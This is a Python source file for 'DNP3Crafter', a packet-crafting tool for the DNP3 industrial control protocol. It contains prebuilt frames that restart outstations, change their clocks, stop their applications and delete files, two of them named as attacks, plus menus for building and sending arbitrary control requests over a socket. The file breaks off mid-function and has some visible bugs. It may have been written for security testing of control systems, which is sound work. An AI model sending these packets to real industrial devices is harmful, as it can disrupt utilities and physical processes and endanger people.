#! /usr/bin/env python

'''DNP3Crafter'''

import sys
import socket
import time
import struct
import binascii
#################################################################
# https://github.com/cristianav/PyCRC/blob/master/PyCRC/CRC16DNP.py
from ctypes import c_ushort

"Constants"
sendOnly = True
sequenceT = 191
sequenceA = 191
Confirm = "\x00"
Read = "\x01"
Write = "\x02"
Select = "\x03"
Operate = "\x04"
Dir_Operate = "\x05"
Dir_Operate_no_res = "\x06"
Freeze = "\x07"
Freeze_no_res = "\x08"
Freeze_Clear = "\x09"
Freeze_Clear_no_res = "\x0A"
Freeze_Time = "\x0B"
Freeze_Time_no_res = "\x0C"
Cold_Restart = "\x0D"
Warm_Restart = "\x0E"
Init_Data = "\x0F"
Init_App = "\x10"
Start_App = "\x11"
Stop_App = "\x12"
Slave_Configure = "\x13"
Enable_Unsolicaited = "\x14"
Disable_Unsolicaited = "\x15"
Assign_Class = "\x16"
Delay_Measurement = "\x17"
Record_Time = "\x18"
Open_File = "\x19"
Close_File = "\x1A"
Delete_File = "\x1B"
Get_Info = "\x1C"
Auth_File = "\x1D"
Abort_File = "\x1E"

class CRC16DNP(object):
	crc16dnp_tab = []

	# The CRC's are computed using polynomials.
	# Here is the most used coefficient for CRC16 DNP
	crc16dnp_constant = 0xA6BC

	def __init__(self):
		# initialize the precalculated tables
		if not len(self.crc16dnp_tab):
			self.init_crc16dnp()

	def calculate(self, input_data=None):
		try:
			is_string = isinstance(input_data, str)
			is_bytes = isinstance(input_data, bytes)

			if not is_string and not is_bytes:
				raise Exception("Please provide a string or a byte sequence "
								"as argument for calculation.")

			crcValue = 0x0000

			for c in input_data:
				d = ord(c) if is_string else c
				tmp = crcValue ^ d
				rotated = (crcValue >> 8)
				crcValue = rotated ^ int(self.crc16dnp_tab[(tmp & 0x00ff)], 0)

			# after processing the one's complement of the CRC is calculated
			# and the two bytes of the CRC are swapped.
			crcValue ^= 0xffffffff  # (or crcValue = ~crcValue)
			low_byte = (crcValue & 0xff00) >> 8
			high_byte = (crcValue & 0x00ff) << 8
			crcValue = low_byte | high_byte

			return crcValue
		except Exception as e:
			print("EXCEPTION(calculate): {}".format(e))

	def init_crc16dnp(self):
		'''The algorithm use tables with precalculated values'''
		for i in range(0, 256):
			crc = c_ushort(i).value
			for j in range(0, 8):
				if (crc & 0x0001):
					crc = c_ushort(crc >> 1).value ^ self.crc16dnp_constant
				else:
					crc = c_ushort(crc >> 1).value
			self.crc16dnp_tab.append(hex(crc))

''' pre-make packet '''

def dnp3_cold_start():
	header = "\x05\x64\x08\xc4\x01\x00\x64\x00"
	data = "\xde\xce\x0d"
	packet = """%s%s%s%s""" % (header, struct.pack('>H', CRC16DNP().calculate(header)), data, struct.pack('>H', CRC16DNP().calculate(data)))
	return packet

def dnp3_warm_start():
	header = "\x05\x64\x08\xc4\x01\x00\x02\x00"
	data = "\xc0\xce\x0e"
	packet = """%s%s%s%s""" % (header, struct.pack('>H', CRC16DNP().calculate(header)), data, struct.pack('>H', CRC16DNP().calculate(data)))
	return packet

def dnp3_time_change():
	header = "\x05\x64\x12\xc4\x01\x00\x64\x00"
	data = "\xc8\xc8\x02\x32\x01\x07\x01\x96\xd4\x7e\x4d\x45\x01"
	packet = """%s%s%s%s""" % (header, struct.pack('>H', CRC16DNP().calculate(header)), data, struct.pack('>H', CRC16DNP().calculate(data)))
	return packet

def dnp3_write():
	header= "\x05\x64\x08\xc4\x01\x00\x02\x00"
	data = "\xdd\xce\x02"
	packet = """%s%s%s%s""" % (header, struct.pack('>H', CRC16DNP().calculate(header)), data, struct.pack('>H', CRC16DNP().calculate(data)))
	return packet

def dnp3_data_attack():
	header= "\x05\x64\x08\xc4\x01\x00\x02\x00"
	data =  "\xde\xce\x0f"
	packet = """%s%s%s%s""" % (header, struct.pack('>H', CRC16DNP().calculate(header)), data, struct.pack('>H', CRC16DNP().calculate(data)))
	return packet

def dnp3_app_attack():
	header = "\x05\x64\x08\xc4\x01\x00\x02\x00"
	data = "\xde\xce\x12"
	packet = """%s%s%s%s""" % (header, struct.pack('>H', CRC16DNP().calculate(header)), data, struct.pack('>H', CRC16DNP().calculate(data)))
	return packet

def dnp3_request_write_time_date():
	header = "\x05\x64\x12\xc4\x01\x00\x64\x00"
	data = "\xc0\xc5\x02\x32\x01\x07\x01\xf8\xb8\x6c\xaa\xf0\x00"
	packet = """%s%s%s%s""" % (header, struct.pack('>H', CRC16DNP().calculate(header)), data, struct.pack('>H', CRC16DNP().calculate(data)))
	return packet

def dnp3_file_delete():
	header = "\x05\x64\x08\xc4\x01\x00\x02\x00"
	data = "\xde\xce\x1b"
	packet = """%s%s%s%s""" % (header, struct.pack('>H', CRC16DNP().calculate(header)), data, struct.pack('>H', CRC16DNP().calculate(data)))
	return packet

''''''

''' set dnp3 control TODO: '''
def dnp3_control():
	try:
		print "Enter DNP3 control"
		control = binascii.unhexlify(str(raw_input()))
		return control
	except TypeError:
		return dnp3_control()

''''''

''' print dnp3 function  and call the set the function'''
def dnp3_function():
	print """
	Dnp3 function
	1:Confirm
	2:Read
	3:Write
	4:Select
	5:Operate
	6:Dir Operate
	7:Dir Operate no resp
	8:Freeze
	9:Freeze no resp
	10:Freeze clear
	11:Freeze clear no resp
	12:Cold Restart
	13:Warm Restart
	14:Init Data
	15:Init App
	16:Start App
	17:Stop App
	18:Slave Configure
	19:Enable Unsolicaited
	20:Disable Unsolicaited
	21:Assign Class
	22:Delay Measurement
	23:Record Time
	24:Open File
	25:Close File
	26:Delete File
	27:Get Info
	28:Auth File
	29:Abort File """

	Function = Set_Dnp3_function()

	"continue to get a valid response"
	while Function == False:
		Function = Set_Dnp3_function()
	return Function

def Set_Dnp3_function():
	print "Enter a function: "
	value = int(raw_input())
	if value == 1:
		function = Confirm
	elif value == 2:
		function = Read
	elif value == 3:
		function = Write
	elif value == 4:
		function = Select
	elif value == 5:
		function = Operate
	elif value == 5:
		function = Operate
	elif value == 6:
		function = Dir_Operate
	elif value == 7:
		function = Dir_Operate_no_res
	elif value == 8:
		function = Freeze
	elif value == 9:
		function = Freeze_no_res
	elif value == 10:
		function = Freeze_Clear
	elif value == 11:
		function = Freeze_Clear_no_res
	elif value == 12:
		group=""
		function = Cold_Restart
	elif value == 13:
		group=""
		function = Warm_Restart
	elif value == 14:
		group=""
		function = Init_Data
	elif value == 15:
		group=""
		function = Init_App
	elif value == 16:
		group=""
		function = Start_App
	elif value == 17:
		group=""
		function = Stop_App
	elif value == 18:
		function = Slave_Configure
	elif value == 19:
		function = Enable_Unsolicaited
	elif value == 20:
		function = Disable_Unsolicaited
	elif value == 21:
		function = Assign_Class
	elif value == 22:
		function = Delay_Measurement
	elif value == 23:
		function = Record_Time
	elif value == 24:
		function = Open_File
	elif value == 25:
		function = Close_File
	elif value == 26:
		function = Delete_File
	elif value == 27:
		function = Get_Info
	elif value == 28:
		function = Auth_File
	elif value == 29:
		function = Abort_File
	else:
		function = False
	return function,value
''''''

''' sequence code for dnp3 '''
def T_seq():
	global sequenceT
	sequenceT = sequenceT + 1
	return hex(sequenceT)[2:].decode('hex')

def A_seq():
	global sequenceA
	sequenceA = sequenceA + 1
	#print (hex(sequenceA),"in hexadecimal.")
	return hex(sequenceA)[2:].decode('hex')
''''''

''' print group available for each group if function don't have group available it should directly sent the packet '''
def print_group_type(Function_type):
    	print "group " ,Function_type
	if Function_type == 100:
		print """
		Main Group Type             | Other Group Type
		0: Device Attributes        | 2: Binary Input Change
		1: Binary Input             | 4: Double-Bit Input Change
		3: Double-Bit Inputs        | 11: Binary Output Change Event
		10: Binary Outputs          | 12: Control Relay Output
		12: Binart Outputs Commands | 13: Binary Output Command
		20: Counters                | 22: Counter Event Change
		21: Frozen Counters         | 23 Frozen Counter Event
		30: Analog Inputs           | 32: Analog Input Change Event
		34: Analog Inputs Deadband  | 42: Analog Output Change Event
		40: Analog Outputs          | 51: Time and Date Common Time of Occurrence
		41: Analog Outputs Commands | 88: Data Set - Snapshot
		50: Time And Data           | 87: Data Set - Present Value
		60: Class Poll Data Request | 111: Octet String Event Change
		70: File Identifiers
		80: Internal
		87: Data Sets
		110: Octet String Object
		120: Authentication Object
		"""
	elif Function_type == 1:
		print"""
	Group Type
	0: Device Attributes
	1: Binary Input
	2: Binary Input Event
	3: Double-Bit Inputs
	10: Binary Outputs
	11: Binary Output Event
	13: Binary Output Command Event
	20: Counters
	21: Frozen Counters
	22: Counter Event
	23: Frozen Counter Event
	30: Analog Inputs
	31: Frozen Analog Input
	32: Analog Input Event
	33: Frozen Analog Input Event
	34: Analog Inputs Deadband
	40: Analog Outputs
	42: Analog Output Event
	43: Analog Output Command Event
	50: Time and Date
	60: Class Objects
	70: File-Control
	81: Device Storage
	83: Data Set
	85: Data Set Prototype
	86: Data Set Descriptor
	87: Data Set Event
		"""

	elif Function_type == 2:
		print"""
	Group Type
	0: Device Attributes
	10: Binary Outputs
	34: Analog Inputs Deadband
	50: Time and Date
	70: File-Control
	80: Internal Indications
	85: Data Set Prototype
	86: Data Set Descriptor
	87: Data Set Event
		"""
	elif Function_type == 3:
		print"""
	Group Type
	12: Binary Output Command
	41: Analog Output Command
	87: Data Set - Present Value
		"""
	elif Function_type == 4:
		print"""
	Group Type
	12: Binary Output Command
	41: Analog Output Command
		"""
	elif Function_type == 5:
		print"""
	Group Type
	12: Binary Output Command
	41: Analog Output Command
	87: Data Set - Present Value
		"""
	elif Function_type == 6:
		print"""
	Group Type
	12: Binary Output Command
	41: Analog Output Command
	87: Data Set - Present Value
		"""
	elif Function_type == 7:
		print"""
	Group Type
	20: Counters
	30: Analog Inputs
		"""
	elif Function_type == 8:
		print"""
	Group Type
	20: Counters
	30: Analog Inputs
		"""
	elif Function_type == 9:
		print"""
	Group Type
	20: Counters
		"""
	elif Function_type == 10:
		print"""
		Group Type
		20: Counters
		"""
	elif Function_type == 11:
		print"""
	Group Type
	20: Counters
	30: Analog Inputs
	50: Time and Date
		"""
	elif Function_type == 20:
		print"""
	Group Type
	60: Class Objects
		"""
	elif Function_type == 21:
		print"""
	Group Type
	60: Class Objects
		"""
	elif Function_type == 22:
		print"""
	Group Type
	1: Binary Input
	3: Double-Bit Inputs
	13: Binary Output Command Event
	20: Counters
	21: Frozen Counters
	30: Analog Inputs
	31: Frozen Analog Input
	40: Analog Outputs
	41: Analog Output Command
	60: Class Objects
	86: Data Set Descriptor
		"""
	elif Function_type == 25:
		print"""
	Group Type
	70: File-Control
		"""
	elif Function_type == 26:
		print"""
	Group Type
	70: File-Control
		"""
	elif Function_type == 27:
		print"""
	Group Type
	70: File-Control
		"""
	elif Function_type == 28:
		print"""
	Group Type
	70: File-Control
		"""
	elif Function_type == 29:
		print"""
	Group Type
	70: File-Control
		"""
	elif Function_type == 30:
		print"""
	Group Type
	70: File-Control
		"""

def set_group(Function_type):
	print_group_type(Function_type)
	print "Enter Group type"
	Group = int(raw_input())
	Group =binascii.unhexlify(str(format(Group, '#04x').replace("0x","")))
	return Group

''''''

''' print what variation  is available for each function within it group '''
def print_group_var(function,group):
    	print "funtion: " + str(function) + " group: " + str(int(group.encode("hex"), 16))
	group = int(group.encode("hex"), 16)
	if function == 1 and group == 0:
		print"""
	196:Device Attributes - Configuration ID
	197:Device Attributes - Configuration version
	198:Device Attributes - Configuration build date
	199:Device Attributes - Configuration last change date
	200:Device Attributes - Configuration signature
	201:Device Attributes - Configuration signature algorithm
	202:Device Attributes - Master Resource ID (mRID)
	203:Device Attributes - Device altitude
	204:Device Attributes - Device longitude
	205:Device Attributes - Device latitude
	206:Device Attributes - User-assigned secondary operator name
	207:Device Attributes - User-assigned primary operator name
	208:Device Attributes - User-assigned system name
	209:Device Attributes - Secure authentication version
	210:Device Attributes - Number of security statistics per association
	211:Device Attributes - Identifier of support for user-specific Attributes
	212:Device Attributes - Number of master-defined data set prototypes
	213:Device Attributes - Number of outstation-defined data set prototypes
	214:Device Attributes - Number of master-defined data set
	215:Device Attributes - Number of outstation-defined data sets
	216:Device Attributes - Max number of binary outputs per request
	217:Device Attributes - Local timing accuracy
	218:Device Attributes - Duration of timing accuracy
	219:Device Attributes - Support for analog output events
	220:Device Attributes - Max analog output index
	221:Device Attributes - Number of analog outputs
	222:Device Attributes - Support for binary output events
	223:Device Attributes - Max binary output index
	224:Device Attributes - Number of binary outputs
	225:Device Attributes - Support for frozen counter events
	226:Device Attributes - Support for frozen counters
	227:Device Attributes - Support for counter events
	228:Device Attributes - Max counter index
	229:Device Attributes - Number of counter points
	230:Device Attributes - Support for frozen analog inputs
	231:Device Attributes - Support for analog input events
	232:Device Attributes - Maximum analog input index
	233:Device Attributes - Number of analog input points
	234:Device Attributes - Support for double-bit binary input events
	235:Device Attributes - Maximum double-bit binary input index
	236:Device Attributes - Number of double-bit binary input points
	237:Device Attributes - Support for binary input events
	238:Device Attributes - Max binary input index
	239:Device Attributes - Number of binary input points
	240:Device Attributes - Max transmit fragment size
	241:Device Attributes - Max receive fragment size
	242:Device Attributes - Device manufacturer software version
	243:Device Attributes - Device manufacturer hardware version
	244:Device Attributes - User-assigned owner name
	245:Device Attributes - User-assigned location name
	246:Device Attributes - User-assigned ID code/number
	247:Device Attributes - User-assigned device name
	248:Device Attributes - Device serial number
	249:Device Attributes - DNP subset and conformance
	250:Device Attributes - Device manufacturer product name and model
	252:Device Attributes - Device manufacturer name
	254:Device Attributes - Non-specific all Attributes request
	255:Device Attributes - List of Attribute variations
		"""
	if function == 1 and group == 1:
		print """
	Static_Type
	0:Binary Input - Any Variations
	1:Binary Input - Packed Format(1 bit)
	2:Binary Input - Status with Flags(1 octet)
		"""
	elif function == 1 and group == 2:
		print """
	Event_Type
	0:Binary Input Event - Any Variations
	1:Binary Input Event(1 octet)
	2:Binary Input Event - with Absolute Time(7 octet)
	3:Binary Input Event - with Relative Time (3 octet)
		"""
	elif function == 1 and group == 3:
		print """
	Static_Type
	0:Double-bit Binary Input - Any Variations
	1:Double-bit Binary Input - Packed Format(2 bits)
	2:Double-bit Binary Input - Status with Flags(1 octets)
		"""
	elif function == 1 and group == 4:
		print """
	Event_Type
	0:Double-bit Binary Input Event - Any Variations
	1:Double-bit Binary Input Event (7 octets)
	2:Double-bit Binary Input Event with Absolute Time(7 octets)
	3:Double-bit Binary Input Event with Relative Time(3 octets)
		"""
	elif function == 1 and group == 10:
		print """
	Static_Type
	0:Binary Output - Any Variations
	1:Binary Output - Packed Format(1 bit)
	2:Binary Output - Status with Flags(1 octet)
		"""
	elif function == 1 and group == 11:
		print """
	Event_Type
	0:Binary Output Event - Any Variations
	1:Binary Output Event - Status (1 octet)
	2:Binary Output Event - Status with Time(7 octets)
		"""
	elif function == 1 and group == 13:
		print """
	Event_Type
	0:Binary Output Command Event - Any Variations
	1:Binary Output Command Event - Command Status (1 octet)
	2:Binary Output Command Event - Command Status with Time (7 octets)
		"""
	elif function == 1 and group == 20:
		print """
	Static_Type
	0:Counter - Any Variations
	1:Counter - 32-bit with Flag(5 octet)
	2:Counter - 16-bit with Flag(3 octet)
	5:Counter - 32-bit w/o Flag(4 octet)
	6:Counter - 16-bit w/o Flag(2 octet)
		"""
	elif function == 1 and group == 21:
		print """
	Static_Type
	0:Frozen Counter - Any Variations
	1:Frozen Counter - 32-bit with Flag(5 octet)
	2:Frozen Counter - 16-bit with Flag(3 octet)
	5:Frozen Counter - 32-bit with Flag and Time(11 octet)
	6:Frozen Counter - 16-bit with Flag and Time(9 octet)
	9:Frozen Counter - 32-bit w/o Flag(4 octets)
	10:Frozen Counter - 16-bit w/o Flag(2 octets)
		"""
	elif function == 1 and group == 22:
		print """
	Event_Type
	0:Counter Event - Any Variations
	1:Counter Event - 32-bit with Flag(5 octets)
	2:Counter Event - 16-bit with Flag(3 octets)
	5:Counter Event - 32-bit with Flag and Time(11 octets)
	6:Counter Event - 32-bit with Flag and Time(9 octets)
		"""
	elif function == 1 and group == 23:
		print """
	Event_Type
	0:Frozen Counter Event - Any Variations
	1:Frozen Counter Event - 32-bit with Flag(5 octets)
	2:Frozen Counter Event - 16-bit with Flag(3 octets)
	5:Frozen Counter Event - 32-bit with Flag and Time(11 octets)
	6:Frozen Counter Event - 16-bit with Flag and Time(9 octets)
		"""
	elif function == 1 and group == 30:
		print """
	Static_Type
	0:Analog Input - Any Variations
	1:Analog Input - 32-bit with Flag(5 octets)
	2:Analog Input - 16-bit with Flag(3 octets)
	3:Analog Input - 32-bit w/o Flag(4 octets)
	4:Analog Input - 16-bit w/o Flag(2 octets)
	5:Analog Input - Single-prec. FP with Flag(5 octets)
	6:Analog Input - Double-prec. FP with Flag(9 octets)
		"""
	elif function == 1 and group == 31:
		print """
	Static_Type
	0:Frozen Analog Input - Any Variations
	1:Frozen Analog Input - 32-bit with Flag(5 octets)
	2:Frozen Analog Input - 16-bit with Flag(3 octets)
	3:Frozen Analog Input - 32-bit with Time-of-Freeze(11 octets)
	4:Frozen Analog Input - 16-bit with Time-of-Freeze(9 octets)
	5:Frozen Analog Input - 32-bit w/o Flag(4 octets)
	6:Frozen Analog Input - 16-bit w/o Flag(2 octets)
	7:Frozen Analog Input - Single-prec. FP with Flag(5 octets)
	8:Frozen Analog Input - Double-prec. FP with Flag(9 octets)
		"""
	elif function == 1 and group == 32:
		print """
	0:Analog Input Event - Any Variations
	1:Analog Input Event - 32-bit(5 octets)
	2:Analog Input Event - 16-bit (3 octets)
	3:Analog Input Event - 32-bit with Time(11 octets)
	4:Analog Input Event - 16-bit with Time(9 octets)
	5:Analog Input Event - Single-prec. FP (5 octets)
	6:Analog Input Event - Double-prec. FP (9 octets)
	7:Analog Input Event - Single-prec. FP with Time(11 octets)
	8:Analog Input Event - Double-prec. FP with Time(15 octets)
		"""
	elif function == 1 and group == 33:
		print """
	0:Frozen Analog Input Event - Any Variations
	1:Frozen Analog Input Event - 32-bit(5 octets)
	2:Frozen Analog Input Event - 16-bit(3 octets)
	3:Frozen Analog Input Event - 32-bit with Time(11 octets)
	4:Frozen Analog Input Event - 16-bit with Time(9 octets)
	5:Frozen Analog Input Event - Single-prec. FP (5 octets)
	6:Frozen Analog Input Event - Double-prec. FP (9 octets)
	7:Frozen Analog Input Event - Single-prec. FP with Time(11 octets)
	8:Frozen Analog Input Event - Double-prec. FP with Time(15 octets)
		"""
	elif function == 1 and group == 34:
		print """
	0:Analog Input Deadband - Any Variations
	1:Analog Input Deadband - 16-bit(2 octets)
	2:Analog Input Deadband - 32-bit(4 octets)
	3:Analog Input Deadband - Single-prec. FP(4 octets)
		"""
	elif function == 1 and group == 40:
		print """
	0:Analog Output Status - Any Variations
	1:Analog Output Status - 32-bit with Flag(5 octets)
	2:Analog Output Status - 16-bit with Flag(3 octets)
	3:Analog Output Status - Single-prec. FP with Flag(5 octets)
	4:Analog Output Status - Double-prec. FP with Flag(9 octets)
		"""
	elif function == 1 and group == 42:
		print """
	0:Analog Output Event - Any Variations
	1:Analog Output Event - 32-bit(5 octets)
	2:Analog Output Event - 16-bit (3 octets)
	3:Analog Output Event - 32-bit with Time(11 octets)
	4:Analog Output Event - 16-bit with Time(9 octets)
	5:Analog Output Event - Single-prec. FP (5 octets)
	6:Analog Output Event - Double-prec. FP (9 octets)
	7:Analog Output Event - Single-prec. FP with Time (11 octets)
	8:Analog Output Event - Double-prec. FP with Time (15 octets)
		"""
	elif function == 1 and group == 43:
		print """
	0:Analog Output Command Event - Any Variations
	1:Analog Output Command Event - 32-bit (5 octets)
	2:Analog Output Command Event - 16-bit (3 octets)
	3:Analog Output Command Event - 32-bit with Time (11 octets)
	4:Analog Output Command Event - 16-bit with Time (9 octets)
	5:Analog Output Command Event - Single-prec. FP (5 octets)
	6:Analog Output Command Event - Double-prec. FP (9 octets)
	7:Analog Output Command Event - Single-prec. FP with Time (11 octets)
	8:Analog Output Command Event - Double-prec. FP with Time (15 octets)
		"""
	elif function == 1 and group == 50:
		print """
	0:Time and Date - Absolute Time (5 octets)
	4:Time and Date - Indexed Absolute Time and Long Interval (11 octets)
		"""
	elif function == 1 and group == 60:
		print """
	1:Class Objects - Class 0 Data
	2:Class Objects - Class 1 Data
	3:Class Objects - Class 2 Data
	4:Class Objects - Class 3 Data
		"""
	elif function == 1 and group == 70:
		print """
	5:File-Control - File Transport
	6:File-Control - File Transport Status
		"""
	elif function == 1 and group == 80:
		print """
	1:Internal Indications - Packed Format (2 octets)
		"""
	elif function == 1 and group == 81:
		print """
	1:Device Storage - Buffer Fill Status
		"""
	elif function == 1 and group == 83:
		print """
	1:Data Set - Private Registration Object
	2:Data Set - Private Registration Object Descriptor
		"""
	elif function == 1 and group == 85:
		print """
	0:Data Set Prototype - Any Variations
	1:Data Set Prototype - With UUID
		"""
	elif function == 1 and group == 86:
		print """
	1:Data Set Descriptor - Data Set Contents
	2:Data Set Descriptor - Characteristics (1 octets)
	3:Data Set Descriptor - Point Index Attributes
		"""
	elif function == 1 and group == 87:
		print """
	1: Data Set - Any Variations
		"""
	elif function == 1 and group == 110:
		print """
	1: 
		"""
		
	if function == 2 and group == 0:
		print """
	241:Device Attributes - Max receive fragment size
	245:Device Attributes - User-assigned location name
	246:Device Attributes - User-assigned ID code/number
	247:Device Attributes - User-assigned device name
		"""
	elif function == 2 and group == 10:
		print """
	Static_Type:
	1:Binary Output - Packed Format(1 bit)
		"""
	elif function == 2 and group == 34:
		print """
	1:Analog Input Deadband - 16-bit(2 octets)
	2:Analog Input Deadband - 32-bit(4 octets)
	3:Analog Input Deadband - Single-prec. FP(4 octets)
		"""
	elif function == 2 and group == 50:
		print """
	0:Time and Date - Absolute Time (5 octets)
	3:Time and Date - Absolute Time at Last Recorded Time (6 octets)
	4:Time and Date - Indexed Absolute Time and Long Interval (11 octets)
		"""
	elif function == 2 and group == 70:
		print """
	5:File-Control - File Transport
		"""
	elif function == 2 and group == 80:
		print """
	1:Internal Indications - Packed Format (2 octets)
		"""
	elif function == 2 and group == 85:
		print """
	0:Data Set Prototype - Any Variations
		"""
	elif function == 2 and group == 86:
		print """
	1:Data Set Descriptor - Data Set Contents
	3:Data Set Descriptor - Point Index Attributes
		"""
	elif function == 2 and group == 87:
		print """
	1: Data Set - Present Value
		"""
	if function == 3 and group == 12:
		print """
	Command_Type
	1:Binary Output Command - Control Relay Output Block(11 octets)
	2:Binary Output Command - Pattern Control Block(11 octets)
	3:Binary Output Command - Pattern Control Block(n bits)
		"""
	elif function == 3 and group == 41:
		print """
	1:Analog Output Command - 32-bit(5 octets)
	2:Analog Output Command - 16-bit(3 pctets)
	3:Analog Output Command - Single-prec. FP (5 octets)
	4:Analog Output Command - Double-prec. FP (9 octets)
		"""
	elif function == 3 and group == 87:
		print """
	1: Data Set - Present Value
		"""
	if function == 4 and group == 12:
		print """
	Command_Type
	1:Binary Output Command - Control Relay Output Block(11 octets)
	2:Binary Output Command - Pattern Control Block(11 octets)
	3:Binary Output Command - Pattern Control Block(n bits)
		"""
	elif function == 4 and group == 41:
		print """
	1:Analog Output Command - 32-bit(5 octets)
	2:Analog Output Command - 16-bit(3 pctets)
	3:Analog Output Command - Single-prec. FP (5 octets)
	4:Analog Output Command - Double-prec. FP (9 octets)
		"""
	if function == 5 and group == 12:
		print """
	Command_Type
	1:Binary Output Command - Control Relay Output Block(11 octets)
	2:Binary Output Command - Pattern Control Block(11 octets)
	3:Binary Output Command - Pattern Control Block(n bits)
		"""
	elif function == 5 and group == 41:
		print """
	1:Analog Output Command - 32-bit(5 octets)
	2:Analog Output Command - 16-bit(3 pctets)
	3:Analog Output Command - Single-prec. FP (5 octets)
	4:Analog Output Command - Double-prec. FP (9 octets)
		"""
	elif function == 5 and group == 87:
		print """
	1: Data Set - Present Value
		"""
	if function == 6 and group == 12:
		print """
	Command_Type
	1:Binary Output Command - Control Relay Output Block(11 octets)
	2:Binary Output Command - Pattern Control Block(11 octets)
	3:Binary Output Command - Pattern Control Block(n bits)
		"""
	elif function == 6 and group == 41:
		print """
	1:Analog Output Command - 32-bit(5 octets)
	2:Analog Output Command - 16-bit(3 pctets)
	3:Analog Output Command - Single-prec. FP (5 octets)
	4:Analog Output Command - Double-prec. FP (9 octets)
		"""
	elif function == 6 and group == 87:
		print """
	1: Data Set - Present Value
		"""
	if function == 7 and group == 20:
		print """
	Static_Type
	0:Counter - Any Variations
		"""
	elif function == 7 and group == 30:
		print """
	Static_Type
	0:Analog Input - Any Variations
		"""
	if function == 8 and group == 20:
		print """
	Static_Type
	0:Counter - Any Variations
		"""
	elif function == 8 and group == 30:
		print """
	Static_Type
	0:Analog Input - Any Variations
		"""
	if function == 9 and group == 20:
		print """
	Static_Type
	0:Counter - Any Variations
		"""
	if function == 10 and group == 20:
		print """
	Static_Type
	0:Counter - Any Variations
		"""
	if function == 11 and group == 20:
		print """
	Static_Type
	0:Counter - Any Variations
		"""
	elif function == 11 and group == 30:
		print """
	Static_Type
	0:Analog Input - Any Variations
		"""
	elif function == 11 and group == 50:
		print """
	2:Time and Date - Absolute Time and Interval (10 octets)
		"""
	if function == 12 and group == 20:
		print """
	Static_Type
	0:Counter - Any Variations
		"""
	elif function == 12 and group == 50:
		print """
	2:Time and Date - Absolute Time and Interval (10 octets)
		"""

	if function == 20 and group == 60:
		print """
	2:Class Objects - Class 1 Data
	3:Class Objects - Class 2 Data
	4:Class Objects - Class 3 Data
		"""

	if function == 21 and group == 60:
		print """
	2:Class Objects - Class 1 Data
	3:Class Objects - Class 2 Data
	4:Class Objects - Class 3 Data
		"""
	if function == 22 and group == 1:
		print """
	Static_Type
	0:Binary Input - Any Variations
		"""
	elif function ==22 and group == 3:
		print """
	Static_Type
	0:Double-bit Binary Input - Any Variations
		"""
	elif function == 22 and group == 10:
		print """
	Static_Type
	0:Binary Output - Any Variations
		"""
	elif function == 22 and group == 12:
		print """
	Command_Type
	0:Binary Output Command - Any Variations
		"""
	elif function == 22 and group == 20:
		print """
	Static_Type
	0:Counter - Any Variations
		"""
	elif function == 22 and group == 21:
		print """
	Static_Type
	0:Frozen Counter - Any Variations
		"""
	elif function == 22 and group == 30:
		print """
	Static_Type
	0:Analog Input - Any Variations
		"""
	elif function == 22 and group == 31:
		print """
	Static_Type
	0:Frozen Analog Input - Any Variations
		"""
	elif function == 22 and group == 40:
		print """
	0:Analog Output Status - Any Variations
		"""
	elif function == 22 and group == 41:
		print """
	0:Analog Output Command - Any Variations
		"""
	elif function == 22 and group == 60:
		print """
	1:Class Objects - Class 0 Data
	2:Class Objects - Class 1 Data
	3:Class Objects - Class 2 Data
	4:Class Objects - Class 3 Data
		"""
	elif function == 22 and group == 86:
		print """
	0:Data Set Descriptor - Any Variations
		"""
	if function == 25  and group == 70:
		print """
	3:File-Control - File Command
		"""
	if function == 26  and group == 70:
		print """
	3:File-Control - File Command
		"""
	if function == 27  and group == 70:
		print """
	3:File-Control - File Command
		"""
	if function == 28 and group == 70:
		print """
	7:File-Control - File Descriptor
		"""
	if function == 29 and group == 70:
		print """
	2:File-Control - Authentication
		"""
	if function == 30 and group == 70:
		print """
	4:File-Control - File Command Status
		"""
	if function == 31 and group == 70:
		print """
	8:File-Control - File Specification String
		"""

def Variation(function,group):
	print_group_var(function,group)
	print "Enter the Variation "
	classNum = int(raw_input())
	classNum =binascii.unhexlify(str(format(classNum, '#04x').replace("0x","")))
	return classNum

''''''

def send_dnp3_packet(the_sock=None, the_pkt='', pkt_id=0):
	ret = None
	if sendOnly:
		print "Request length (%s):\t%d" % (pkt_id, len(the_pkt))
		print "Request packet (%s) (in hex):\t%s" % (pkt_id, the_pkt.encode('hex'))
		the_sock.send(the_pkt)
	else:
		if the_sock and the_pkt:
			print "here"
			#print_start_block()
			try:
				print "Request length (%s):\t%d" % (pkt_id, len(the_pkt))
				print "Request packet (%s) (in hex):\t%s" % (pkt_id, the_pkt.encode('hex'))
				the_sock.send(the_pkt)
				ret = the_sock.recv (1000)
				if ret:
					print "Response length (%s):\t%d" % (pkt_id, len(ret))
					print "Response packet (%s) (in hex):\t%s" % (pkt_id, the_pkt.encode('hex'))
					print
			except Exception as e:
				if 'Broken pipe' in str(e):
					print colored("*** Slave has become unresponsive ***\n", 'red')
					sys.exit()
			#print_end_block()
		return ret

# TODO finish those three function with real check and not just let user enter anything
def print_qulifier_code(function,group):
	function = int(function)
	print "funtion " + str(function) + " " + str(int(group.encode("hex"), 16))
	group = int(group.encode("hex"), 16)
	#function = function
	if function == 1 and group == 0:
		print"Enter 0 or 6"
	if function == 1 and group == 1:
		print " Enter 0 , 1, or 6 "
	elif function == 1 and group == 2:
		print " ???"
	elif function == 1 and group == 3:
		print " Enter 0 , 1, or 6 "
	elif function == 1 and group == 4:
		print " ???"
	elif function == 1 and group == 10:
		print " Enter 0 , 1, or 6 "
	elif function == 1 and group == 11:
		print " ???"
	elif function == 1 and group == 13:
		print " ???"
	elif function == 1 and group == 20:
		print " Enter 0 , 1, or 6 "
	elif function == 1 and group == 21:
		print " Enter 0 , 1, or 6 "
	elif function == 1 and group == 22:
		print " ???"
	elif function == 1 and group == 23:
		print " ???"
	elif function == 1 and group == 30:
		print " Enter 0 , 1, or 6 "
	elif function == 1 and group == 31:
		print " ???"
	elif function == 1 and group == 32:
		print " ???"
	elif function == 1 and group == 33:
		print " ???"
	elif function == 1 and group == 34:
		print " Enter 0 , 1, or 6 "
	elif function == 1 and group == 40:
		print " Enter 0 , 1, or 6 "
	elif function == 1 and group == 42:
		print " ???"
	elif function == 1 and group == 43:
		print " ???"
	elif function == 1 and group == 50:
		print "Enter 7 "
	elif function == 1 and group == 60:
		print " Enter 6 , 7, or 8 (note: variation 1 only use 6) "
	elif function == 1 and group == 70:
		print "Enter 91"
	elif function == 1 and group == 80:
		print " Enter 0 or 1 "
	elif function == 1 and group == 81:
		print " ??? "
	elif function == 1 and group == 83:
		print " ??? "
	elif function == 1 and group == 85:
		print " Enter 6 "
